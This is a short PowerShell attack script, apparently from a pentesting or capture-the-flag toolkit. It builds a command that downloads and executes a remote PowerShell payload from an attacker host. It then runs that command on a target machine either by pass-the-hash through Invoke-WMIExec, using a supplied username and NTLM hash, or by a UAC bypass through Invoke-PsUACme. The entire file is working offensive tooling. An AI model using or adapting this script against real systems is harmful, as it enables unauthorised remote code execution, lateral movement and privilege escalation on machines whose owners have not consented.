# author: WatchDogOblivion
# description: TODO

param (
    [string]$LHost = "192.168.0.1",
    [string]$LPort = "80",
    [string]$File = "ipwsh.ps1",
    [string]$RHost = "10.10.10.10",

    [switch]$WMIExec = $false,
    [string]$User = "donny",
    [string]$Hash = "b0bf81363146f9af0c636ef45d22b79d",

    [switch]$UAC = $false,
    [string]$Method = "oobe"
)

$Command = "powershell -c `"iex(new-object net.webclient).downloadstring('http://$LHost`:$LPort/$File')`""
if ($WMIExec) {
    Import-Module $PSScriptRoot\lib\pth\Invoke-WMIExec.ps1
    Invoke-WMIExec -Target $RHost -Domain xor -Username $User -Hash $Hash -Command "$Command"    
}
elseif ($UAC) {
    Import-Module $PSScriptRoot\lib\other\Invoke-PsUACme.ps1
    Invoke-PsUACme -method $Method -Payload $Command        
}
